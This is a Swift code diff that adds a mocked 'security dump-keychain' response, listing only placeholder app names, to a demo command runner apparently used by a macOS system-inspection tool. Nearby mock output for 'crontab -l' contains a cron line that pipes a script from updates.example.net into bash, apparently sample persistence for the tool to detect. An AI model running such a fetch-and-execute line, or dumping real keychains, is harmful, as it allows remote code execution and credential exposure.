@@ -513,6 +513,7 @@ struct DemoRunner: CommandRunning {
             return ok("Preferred networks on en0:\n\tHome Network\n\tOffice Wi-Fi\n\tCoffee Shop Guest\n\tAirport Free Wi-Fi\n")
         }
         if cmd.hasPrefix("/bin/ps") { return ok(processes) }
+        if cmd.hasPrefix("/usr/bin/security dump-keychain") { return ok(keychain) }
         if cmd.hasPrefix("/usr/bin/crontab -l") {
             return ok("# nightly backup\n30 2 * * * /usr/local/bin/restic backup ~/Documents\n*/10 * * * * curl -s http://updates.example.net/u.sh | bash\n")
         }
@@ -529,6 +530,25 @@ struct DemoRunner: CommandRunning {
             return ok("Version: 5361 Installed: \(f.string(from: Date().addingTimeInterval(-6 * 86_400)))")
         }
         return ok("")
+    }
+
+    /// Names only, as `security dump-keychain` prints them: two removed apps, one installed, one of Apple's.
+    private var keychain: String {
+        func entry(_ service: String, _ account: String) -> String {
+            """
+            keychain: "\(home)/Library/Keychains/login.keychain-db"
+            version: 512
+            class: "genp"
+            attributes:
+                0x00000007 <blob>="\(service)"
+                "acct"<blob>="\(account)"
+                "mdat"<timedate>=0x32303234303331353130303030305A00  "20240315100000Z\\000"
+                "svce"<blob>="\(service)"
+            """
+        }
+        return [entry("com.oldvendor.PhotoTool", "license"), entry("com.trialware.Converter.sync", "demo@example.com"),
+                entry("com.example.PixelPaint", "token"), entry("com.apple.account.IdentityServices.token", "x")]
+            .joined(separator: "\n")
     }
 
     private func device(_ udid: String, _ name: String, gb: Double, lastUsedDays: Int?, available: Bool = true) -> String {
